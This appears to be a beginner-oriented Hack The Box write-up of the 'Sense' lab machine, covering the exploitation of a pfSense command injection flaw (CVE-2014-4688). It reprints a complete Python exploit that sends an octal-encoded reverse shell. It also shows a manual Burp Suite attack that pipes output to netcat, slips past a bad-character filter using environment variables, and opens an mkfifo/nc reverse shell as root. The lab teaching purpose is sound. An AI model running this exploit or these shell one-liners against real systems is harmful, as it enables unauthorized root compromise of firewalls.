---
layout: single
title: Sense - Hack The Box
excerpt: ""
date: 2021-08-23
classes: wide
header:
  teaser: /assets/images/htb-writeup-sense/sense_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - FreeBSD
  - BurpSuite
  - Command Injection
---

![](/assets/images/htb-writeup-sense/sense_logo.png)

# Description

Description

# Recognition phase

I will do a TCP SYN Port Scan because the normal scan is too slow.

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.60 -oN allPorts

PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

- -p- Scan all ports.
- --open Only ports with open status, not closed or filtered.
- --min-rate 5000 because I want to send 5000 packets per second, this will make the scanning go much faster without losing efficiency and without risk of false positives.
- -vvv Triple verbose to give me more detailed information per console.
- -n Don't apply DNS resolution to make it go a little faster.
- -Pn Don't apply host discovery.

```
nmap -sC -sV -p80,443 10.10.10.60 -oN targeted

PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://sense.htb/
443/tcp open  ssl/https?
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_ssl-date: TLS randomness does not represent time
```

- -sC This parameter launches basic enumeration scripts.
- -sV To detect which versions and services are running on these ports.

It has an ssl certificate, let's see what's here.

Go to https://sense.htb/

It is a pfSense, a free, open source distribution based on FreeBSD, customized to be a firewall and router.  In addition to being a powerful firewall and router platform, it includes a large list of packages that allow you to easily expand the functionality without compromising the security of the system.

![](/assets/images/htb-writeup-sense/login-panel.png)

My first step when I saw this is to investigate the default credentials, I found user:admin password:pfsense, but they didn't work, so I will opt to use ffuf.

```
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://sense.htb/FUZZ -e .php,.txt

index.php               [Status: 200, Size: 5793, Words: 868, Lines: 147]
help.php                [Status: 200, Size: 5793, Words: 868, Lines: 147]
themes                  [Status: 301, Size: 0, Words: 1, Lines: 1]
stats.php               [Status: 200, Size: 5793, Words: 868, Lines: 147]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1]
includes                [Status: 301, Size: 0, Words: 1, Lines: 1]
edit.php                [Status: 200, Size: 5793, Words: 868, Lines: 147]
system.php              [Status: 200, Size: 5793, Words: 868, Lines: 147]
license.php             [Status: 200, Size: 5793, Words: 868, Lines: 147]
status.php              [Status: 200, Size: 5793, Words: 868, Lines: 147]
javascript              [Status: 301, Size: 0, Words: 1, Lines: 1]
changelog.txt           [Status: 200, Size: 271, Words: 35, Lines: 10]
classes                 [Status: 301, Size: 0, Words: 1, Lines: 1]
exec.php                [Status: 200, Size: 5793, Words: 868, Lines: 147]
widgets                 [Status: 301, Size: 0, Words: 1, Lines: 1]
graph.php               [Status: 200, Size: 5793, Words: 868, Lines: 147]
tree                    [Status: 301, Size: 0, Words: 1, Lines: 1]
wizard.php              [Status: 200, Size: 5793, Words: 868, Lines: 147]
shortcuts               [Status: 301, Size: 0, Words: 1, Lines: 1]
pkg.php                 [Status: 200, Size: 5793, Words: 868, Lines: 147]
installer               [Status: 301, Size: 0, Words: 1, Lines: 1]
wizards                 [Status: 301, Size: 0, Words: 1, Lines: 1]
xmlrpc.php              [Status: 200, Size: 384, Words: 78, Lines: 17]
reboot.php              [Status: 200, Size: 5793, Words: 868, Lines: 147]
interfaces.php          [Status: 200, Size: 5793, Words: 868, Lines: 147]
csrf                    [Status: 301, Size: 0, Words: 1, Lines: 1]
system-users.txt        [Status: 200, Size: 106, Words: 9, Lines: 7]
filebrowser             [Status: 301, Size: 0, Words: 1, Lines: 1]
```

- -c For colorized output.
- -e .php,.txt for extensions becouse the vast majority of the code is in PHP (front and back-end) and .txt becouse I always include it I don't have much information.

### Let's visit the most interesting urls.

The only ones that have some interesting information and we don't need to be logged in to see them are system-users.txt, changelog.txt and tree.

## https://10.10.10.60/system-users.txt
![](/assets/images/htb-writeup-sense/system-users.txt.png)

## https://10.10.10.60/changelog.txt
![](/assets/images/htb-writeup-sense/changelog.png)

## https://10.10.10.60/tree
![](/assets/images/htb-writeup-sense/tree.png)

Ok, let's pause and see what we have so far. 
- I googled about /tree as it details the version but there is nothing interesting.
- /system-users.txt has a username and password to try in the login panel.
- /changelog.txt gives us a hint that there is an existing vulnerability.

Let's try to login with these credentials.


![](/assets/images/htb-writeup-sense/logged.png)


### Logged!
I tried with the password indicated in the .txt file but obviously it didn't work, it referred to the default password which is the one we are looking for at the beginning. 

user: rohit
password: pfsense

### We have the version, now let's look for exploits.
```
searchsploit pfsense 2.1.3 

--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                                                                           | php/webapps/43560.py
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

### Exploit:
```
root@kali:/# searchsploit -x php/webapps/43560.py

#!/usr/bin/env python3



# Exploit Title: pfSense <= 2.1.3 status_rrd_graph_img.php Command Injection.

# Date: 2018-01-12

# Exploit Author: absolomb

# Vendor Homepage: https://www.pfsense.org/

# Software Link: https://atxfiles.pfsense.org/mirror/downloads/old/

# Version: <=2.1.3

# Tested on: FreeBSD 8.3-RELEASE-p16

# CVE : CVE-2014-4688



import argparse

import requests

import urllib

import urllib3

import collections



'''

pfSense <= 2.1.3 status_rrd_graph_img.php Command Injection.

This script will return a reverse shell on specified listener address and port.

Ensure you have started a listener to catch the shell before running!

'''



parser = argparse.ArgumentParser()

parser.add_argument("--rhost", help = "Remote Host")

parser.add_argument('--lhost', help = 'Local Host listener')

parser.add_argument('--lport', help = 'Local Port listener')

parser.add_argument("--username", help = "pfsense Username")

parser.add_argument("--password", help = "pfsense Password")

args = parser.parse_args()



rhost = args.rhost

lhost = args.lhost

lport = args.lport

username = args.username

password = args.password





# command to be converted into octal

command = """

python -c 'import socket,subprocess,os;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);

s.connect(("%s",%s));

os.dup2(s.fileno(),0);

os.dup2(s.fileno(),1);

os.dup2(s.fileno(),2);

p=subprocess.call(["/bin/sh","-i"]);'

""" % (lhost, lport)





payload = ""



# encode payload in octal

for char in command:

	payload += ("\\" + oct(ord(char)).lstrip("0o"))



login_url = 'https://' + rhost + '/index.php'

exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"



headers = [

	('User-Agent','Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0'),

	('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),

	('Accept-Language', 'en-US,en;q=0.5'),

	('Referer',login_url),

	('Connection', 'close'),

	('Upgrade-Insecure-Requests', '1'),

	('Content-Type', 'application/x-www-form-urlencoded')

]



# probably not necessary but did it anyways

headers = collections.OrderedDict(headers)



# Disable insecure https connection warning

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



client = requests.session()



# try to get the login page and grab the csrf token

try:

	login_page = client.get(login_url, verify=False)



	index = login_page.text.find("csrfMagicToken")

	csrf_token = login_page.text[index:index+128].split('"')[-1]



except:

	print("Could not connect to host!")

	exit()



# format login variables and data

if csrf_token:

	print("CSRF token obtained")

	login_data = [('__csrf_magic',csrf_token), ('usernamefld',username), ('passwordfld',password), ('login','Login') ]

	login_data = collections.OrderedDict(login_data)

	encoded_data = urllib.parse.urlencode(login_data)



# POST login request with data, cookies and header

	login_request = client.post(login_url, data=encoded_data, cookies=client.cookies, headers=headers)

else:

	print("No CSRF token!")

	exit()



if login_request.status_code == 200:

		print("Running exploit...")

# make GET request to vulnerable url with payload. Probably a better way to do this but if the request times out then most likely you have caught the shell

		try:

			exploit_request = client.get(exploit_url, cookies=client.cookies, headers=headers, timeout=5)

			if exploit_request.status_code:

				print("Error running exploit")

		except:

			print("Exploit completed")
```
Found this on searchsploit, let's see if it works for us or look in other sources.

Pfsense versions 2.2.6 and below contain a remote command execution vulnerability post authentication in the _rrd_graph_img.php page. The vulnerability occurs via the graph GET parameter. A non-administrative authenticated attacker can inject arbitrary operating system commands and execute them as the root user. 
Googling I found the following and this script does what is explained above, so let's try to get command injection.

```
python3 exploit.py --rhost 10.10.10.60 --lhost 10.10.14.5 --lport 443 --username rohit --password pfsense

CSRF token obtained
Running exploit...
Exploit completed
```

```
nc -nlvp 443

listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.60] 10317
sh: can't access tty; job control turned off

whoami
root

cat /root/root.txt
d08c32a5d4..
```

Done!
When I searched searchsploit for a vulnerability I noticed that the bug was in 'status_rrd_rrd_graph_img.php', I researched about this and I would like to exploit it manually from BrupSuite, let's see how to do it.

# Exploiting pfsense manually.

### Open BurpSuite and set the target.
![](/assets/images/htb-writeup-sense/Screenshot_1.png)

### Configure the browser with the proxy to intercept the requests, I use [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) and let's analyze the above script made in python3.

Full script: searchsploit -x php/webapps/43560.py or [Exploit-db](https://www.exploit-db.com/exploits/43560)

In line 58 we can see: exploit_url = "https://" + rhost + "/status_rrd_rrd_graph_img.php?database=queues; "+"printf+" + "'" + payload + "'|sh". This is where the reverse shell payload will be injected. What we have to do is to delete the part of the payload to be able to inject the commands that we want.
I always recommend to read the scripts and if you use it, understand what they do, and if you can try to do it manually, especially to learn and have control at a lower level. 

Then delete the payload and enter the command that we want to be injected, activate the proxy in the browser and intercept the request with BurpSuite to send it to the repeater.

Basically the vulnerable URL would be as follows: [https://10.10.10.60/status_rrd_graph_img.php?database=queues;INJECT COMMAND HERE]

### Foxy proxy activated.
![](/assets/images/htb-writeup-sense/Screenshot_1.png)

### BurpSuite intercept on.
![](/assets/images/htb-writeup-sense/Screenshot_2.png)

### Request intercepted.
![](/assets/images/htb-writeup-sense/Screenshot_3.png)

### Send it to repeater. [With Ctrl+R]
![](/assets/images/htb-writeup-sense/Screenshot_4.png)

### Try it with a test command to see if it works correctly.
Let's try a simple ```echo "test"``` piped with netcat to send it to our attacker's machine.

Full command: ```echo+"test"|nc+10.10.14.6+443```

Piping it with nectat ```|nc+10.10.14.6+443``` causes the output of the previous command, in this case the ```echo+"test"``` to be sent to the ip indicated by the specified port. The reason why I write the + character instead of a space is to avoid problems and that it interprets it correctly, basically url encode the space.

![](/assets/images/htb-writeup-sense/Screenshot_5.png)

Listen on port 443 and wait to receive the output.
```
root@kali:/# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.60] 62260
test
```

It works! Now let's see if we can get into a reverse shell.

Looking for a reverse shell by nc in this repo, I recommend it. [Reverse Shell Cheat Sheet](https://github.com/d4t4s3c/Reverse-Shell-Cheat-Sheet)

I'll try with nc -c /bin/sh 10.10.14.6 443

![](/assets/images/htb-writeup-sense/Screenshot_5.png)

```
root@kali:/# nc -nlvp 443
listening on [any] 443 ...
```
It doesn't work, it must be because there are badchars.
The badchars are invalid or "bad" characters which the program to exploit does not accept them, therefore when the attacker generates his shellcode it is useless, since these characters were not identified and makes the program break.

### Looking for ways to bypasse.


First let's find out which is the badchar starting with / echo+"test+badchar+/"|nc+10.10.14.6+443.
![](/assets/images/htb-writeup-sense/Screenshot_6.png)

```
root@kali:/# nc -nlvp 443
listening on [any] 443 ...
```
It does not work, let's remove the / character to check that everything is correct.
![](/assets/images/htb-writeup-sense/Screenshot_7.png)


```
root@kali:/# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.60] 24352
test badchar
```

This way it works, this means that / is a badchar, now let's try with the character -
![](/assets/images/htb-writeup-sense/Screenshot_14.png)

```
root@kali:/# nc -nlvp 443
listening on [any] 443 ...
```
It doesn't work, - it's another badchar.

To bypass it let's first try URL encoding the badchar.

The - character is %2d url encoded.
![](/assets/images/htb-writeup-sense/Screenshot_15.png)

```
root@kali:/#
nc -nlvp 443
listening on [any] 443 ...
```

It doesn't work either, so we have to find another way.

# Lateral thinking.
We are having command injection on the victim machine, one thing that we can do is to create an environment variable whose value is to print the / character. 
When we want to see the value of that variable, it will print the character /, the important thing about this is that it is already defined at the system level in the victim computer, it will not filter or block it as badchar when we enter it in the URL, because when we call the "malicious" environment variable in the URL it will print the character we need.

Let's see a practical example to understand it more thoroughly.

Let's look at the environment variables already created on the victim computer.
![](/assets/images/htb-writeup-sense/Screenshot_8.png)

```
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.60] 42727
OLDPWD=/
HOME=/
PHP_FCGI_MAX_REQUESTS=500
PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin:/usr/local/sbin
LANG=en_US.ISO8859-1
PHP_FCGI_CHILDREN=1
PWD=/var/db/rrd
```

Now let's create the environment variable whose value is to print the character /, basically its value would be: echo "/". But we cannot send the / character through the URL because it is a badchar, so we have to write / in octal, it would be like this: \057
This we can see it from console with the command man ascii or searching in google a table of octal values, for example [This](https://www-k12.atmos.washington.edu/~ovens/gmt/doc/html/GMT_Docs/node153.html), then to create the environment variable we use the syntax newEnvVar=($value of the variable), in this case it would be bar=$$(printf "\057")
Why printf and not echo? because unlike echo, the printf function can write any combination of numeric values, single characters and strings. This does not mean that with echo we can' t do it, but with printf we ensure a correct operation.
![](/assets/images/htb-writeup-sense/Screenshot_9.png)

```
root@kali:/#
nc -nlvp 443 
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.60] 2549
/
```

It works! We know that the victim machine has netcat so let's send us a reverse shell with a typical nc -c /bin/bash 10.10.14.6 443 replacing the badchars as seen above.
Then what we have to do is to create two environment variables, one for the / character and one for the -, let's see the practical example:
![](/assets/images/htb-writeup-sense/Screenshot_10.png)

To replace the characters by the environment variables could be done manually, but I suggest to do it with utilities like tr or sed as in this case. It is useful to practice hehe.

```
roo@kali:/# echo "nc -c /bin/bash 10.10.14.6 443" | tr ' ' '+' | sed 's/\//${bar}/g' | sed 's/-/${guion}/'

nc+${guion}c+${bar}bin${bar}bash+10.10.14.6+443
```
# Send the reverse shell through BurpSuite

```
root@kali:/# nc -nlvp 443
listening on [any] 443 ...
```
It doesn't work, I tried changing the -c parameter of nectat for -e but it doesn't work either, so I'll do it with the old version of nectat, it would be like this: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f

All this can be seen in the repository I named above.

To send us this reverse shell we will have to change more characters, so with ```echo "test+next+badchar+&"|nc 10.10.14.6``` I try to find out which characters are blocking me from this reverse shell.

It accepts all possible badchars except the & character, so we only have to create an environment variable for it. Use the same methodology as with the other badchars and we are ready to start the reverse shell.

```
root@kali:/# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.60] 12462
;

root@kali:/#nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.60] 27057
|

root@kali:/# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.60] 19381
>

root@kali:/# nc -nlvp 443
listening on [any] 443 ...
```

```
root@kali:/# echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f" | tr ' ' '+' | sed 's/\//${bar}/g' | sed 's/-/${guion}/g' | sed 's/&/${amp}/g'

rm+${bar}tmp${bar}f;mkfifo+${bar}tmp${bar}f;cat+${bar}tmp${bar}f|${bar}bin${bar}sh+${guion}i+2>${amp}1|nc+10.10.14.6+443+>${bar}tmp${bar}f
```

![](/assets/images/htb-writeup-sense/Screenshot_12.png)

```
root@kali:/# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.60] 46397
whoami
root

cat /root/root.txt
d08c32a5d4...
```
We did it! we knew it was going to work because we were able to identify the badchars and also bypasse them, also send us the output of the injected commands through netcat, if it didn't work with the typical nc -c /bin/bash LHOST LPORT, it worked with the old version. 

Thank you very much for reading! This is my second writeup, my idea is to make them for people who started very recently in pentesting. The idea is to learn from each other and above all LEARN! thanks for reading, see you in the next one!

